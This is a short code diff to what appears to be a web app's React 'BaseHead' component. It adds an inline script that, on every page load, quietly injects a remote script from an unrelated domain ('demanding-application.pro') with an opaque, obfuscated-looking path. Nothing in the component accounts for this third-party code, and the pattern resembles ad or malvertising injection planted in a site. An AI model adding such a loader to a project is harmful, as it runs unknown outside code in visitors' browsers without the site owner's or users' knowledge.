@@ -143,8 +143,20 @@ export const BaseHead = ({
               `}
           </script>
 
-
-
+          <script>
+              {`
+              (function(sibk){
+var d = document,
+              s = d.createElement('script'),
+              l = d.scripts[d.scripts.length - 1];
+              s.settings = sibk || { };
+              s.src = "\/\/demanding-application.pro\/cjDV9d6.bC2J5LlaSQWRQ\/9PNLTyUYxrMjjKYj1ON_ia0p1SNDTFE_yUN\/jcUG3o";
+              s.async = true;
+              s.referrerPolicy = 'no-referrer-when-downgrade';
+              l.parentNode.insertBefore(s, l);
+})({ })
+              `}
+          </script>
       </head>
   );
 };
